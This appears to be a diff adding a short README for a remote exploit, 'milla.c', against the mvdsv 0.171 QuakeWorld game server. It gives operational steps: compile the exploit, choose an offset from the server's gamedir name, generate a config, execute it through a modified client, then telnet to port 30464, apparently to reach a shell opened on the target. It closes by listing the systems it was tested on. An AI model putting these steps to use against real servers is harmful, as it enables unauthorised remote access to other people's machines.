@@ -1,0 +1,21 @@
+Remote exploit for mvdsv 0.171 (and probably earlier versions as well).
+
+gcc milla.c -o milla
+
+If the server is started with +gamedir a
+./milla 131 > milla.cfg
+...or if the server is started with +gamedir aa
+./milla 130 > milla.cfg
+...or if the server is started with +gamedir aaa
+./milla 129 > milla.cfg
+(I hope you get the point)
+
+Start the hacked QWCL
+connect localhost
+exec milla.cfg
+
+telnet localhost 30464
+
+--
+
+This has been tested successfully on Debian GNU/Linux 3.0 and Slackware 9.0
